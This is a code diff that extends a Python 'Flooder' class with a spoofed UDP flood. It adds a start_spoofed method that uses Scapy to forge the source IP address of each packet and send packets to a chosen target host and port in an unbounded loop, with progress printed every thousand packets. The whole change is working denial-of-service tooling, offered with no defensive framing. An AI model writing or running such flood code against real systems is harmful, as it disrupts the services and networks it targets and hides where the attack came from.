@@ -1,5 +1,9 @@
 import socket
 import time
+import random
+
+# Uncomment if you have scapy installed
+from scapy.all import IP as scapy_IP, UDP as scapy_UDP, send as scapy_send
 
 class Flooder():
     """
@@ -20,7 +24,9 @@ class Flooder():
 
         self.target_host = target_host
         self.target_port = target_port
+
         self._default_message = message.encode()
+        self._default_spoofed_ip = "192.168.1.100"
 
         self.running: bool = True
         self.socket = None
@@ -58,6 +64,42 @@ class Flooder():
 
         except KeyboardInterrupt:
             # Handle KeyboardInterrupt from the main script
+            print("\n[i] Flood interrupted by user (Ctrl+C).")
+        finally:
+            self.stop()
+
+    def start_spoofed(self, packet_count: int = -1, message: bytes = None, spoofed_ip: str = "192.168.1.100"):
+        """
+        Starts a spoofed UDP flood using Scapy.
+        """
+        # This needed Npcap since I did not want to always run the script
+        # as Admin. Install it from https://npcap.com/ on you local machine
+        print(f"[i] Starting spoofed UDP flood on {self.target_host}:{self.target_port}")
+        print(f"[i] Using message: {self._default_message.decode() if message is None else message.decode()}")
+
+        # Use the provided message or the default one
+        message_to_send = message if message is not None else self._default_message
+
+        self.packets_sent = 0
+        try:
+            while self.running and (packet_count == -1 or self.packets_sent < packet_count):
+                # Construct the IP layer with a spoofed source IP
+                s_ip = spoofed_ip if spoofed_ip is not None else self._default_spoofed_ip
+                ip_layer = scapy_IP(src=s_ip, dst=self.target_host)
+
+                # Construct the UDP layer for the target port
+                udp_layer = scapy_UDP(dport=self.target_port)
+
+                # Stack the layers and payload together to form the full packet
+                packet = ip_layer / udp_layer / message_to_send
+
+                # Send the packet over the wire
+                scapy_send(packet, verbose=0)
+
+                self.packets_sent += 1
+                if self.packets_sent % 1000 == 0:
+                    print(f"[+] Sent {self.packets_sent} spoofed packets.")
+        except KeyboardInterrupt:
             print("\n[i] Flood interrupted by user (Ctrl+C).")
         finally:
             self.stop()
